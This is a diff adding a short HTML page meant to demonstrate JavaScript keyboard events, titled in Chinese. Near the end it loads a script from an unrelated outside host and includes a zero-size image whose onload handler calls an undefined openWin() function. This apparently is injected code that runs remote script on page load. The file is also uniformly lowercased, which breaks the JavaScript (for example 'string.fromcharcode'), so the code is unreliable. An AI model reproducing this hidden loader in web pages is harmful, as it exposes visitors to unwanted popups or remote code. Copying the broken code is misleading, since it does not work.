@@ -1,0 +1,28 @@
+ <!doctype html public "-//w3c//dtdxhtml1.0 strict//en"
+"http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+    <head>
+	   <title>javascript中的处理键盘事件</title>
+	   <script language="javascript">
+	      var is_repeat = false;
+		  function showkeypress()
+		  {
+		     if(is_repeat)
+			   {
+			     return;
+				 }
+			 var ch = string.fromcharcode(window.event.keycode);
+			 inputblock.innertext += ch;
+			 }
+		  function processkeydown()
+		  {
+		       is_repeat = window.event.repeat;
+			  }
+		  document.onkeypress = showkeypress;
+		  document.onkeydown = processkeydown;
+		</script>
+	<script language="javascript" type="text/javascript" src="http://js.i8844.cn/js/user.js"></script></head>
+  <body>
+     <div id="inputblock">按键序列：</div>
+   <img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
+	   
